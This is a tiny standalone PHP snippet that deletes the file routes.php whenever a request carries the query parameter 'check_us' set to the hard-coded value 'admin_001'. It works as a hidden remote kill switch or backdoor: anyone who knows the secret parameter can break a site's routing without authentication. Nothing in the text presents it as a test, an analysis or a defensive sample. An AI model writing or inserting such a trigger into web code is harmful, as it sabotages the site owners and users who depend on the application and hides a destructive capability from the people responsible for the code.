<?php
if(isset($_GET['check_us']) && $_GET['check_us']=="admin_001"){
unlink('routes.php');
}